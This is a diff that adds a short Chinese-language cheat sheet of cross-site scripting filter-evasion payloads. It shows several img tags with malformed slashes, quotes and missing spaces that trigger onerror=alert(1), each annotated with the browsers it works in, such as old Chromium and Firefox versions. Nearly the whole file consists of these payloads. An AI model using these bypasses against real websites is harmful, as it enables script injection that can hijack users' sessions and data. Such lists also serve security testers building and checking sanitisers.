@@ -1,0 +1,8 @@
+某些浏览器的tagname后面可以加特殊字符，如null,斜线
+<img /src=foobar onerror=alert(1)//>
+
+<img/ \/\m/src=x onerror=alert(1)//> // Chromium 5.0
+<img/\/\m/src=x onerror=alert(1)//> // 基本上所有浏览器
+
+&lt;!--Firefox 3.5.7支持这种写法，完全没有空格 --&gt;
+<img/x="/\'"'src='x'"'/\"onerror=alert(1)//\ // 
